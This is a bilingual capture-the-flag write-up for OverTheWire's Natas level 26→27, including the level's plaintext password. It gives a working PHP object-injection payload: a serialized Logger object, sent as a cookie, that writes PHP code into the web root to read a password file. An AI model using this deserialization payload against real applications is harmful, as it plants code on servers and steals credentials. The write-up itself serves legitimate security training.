# Natas Nivel 26 → 27

| Campo | Valor |
|-------|-------|
| **Juego / Game** | Natas |
| **Nivel / Level** | 26 → 27 |
| **URL** | https://overthewire.org/wargames/natas/ |
| **Conexión** | `http://natas26.natas.labs.overthewire.org` |

# username
natas26
# password
cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
# method of solve
We notice from the web app source code that the app serializes data and turn it into a cookie:
```
setcookie("drawing",base64_encode(serialize($drawing)));
```
> When we extract the cookie from the app after submitting data, we see that it contains the data from the app in serialized form
> That means that we can serialize an object that the application uses and inject PHP code that does what we want
```
<?php

class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;
    
    function __construct(){
        $this->initMsg="HackerFrogs";
        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
        $this->logFile = "/var/www/natas/natas26/img/hackerfrogs.php";
    }
}

$hacker_object = new Logger();
echo base64_encode(serialize($hacker_object));

?>

```
After writing the file, use PHP on the terminal to convert the object into base64
```
php payload.php
```
Send this cookie `drawing` to the app via Burp Suite Repeater. Afterwards, we will find the password (printed twitce) at the /img/hackerfrogs.php endpoint

---

## Fuentes / Sources

- OTW: https://overthewire.org/wargames/natas/ - fecha de acceso: 2026-09-25.
- Autor notas: Apuromafo.

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a OverTheWire.
> **EN:** Educational and personal use only. Not affiliated with OverTheWire.

_Fecha de edición: 2026-09-25_
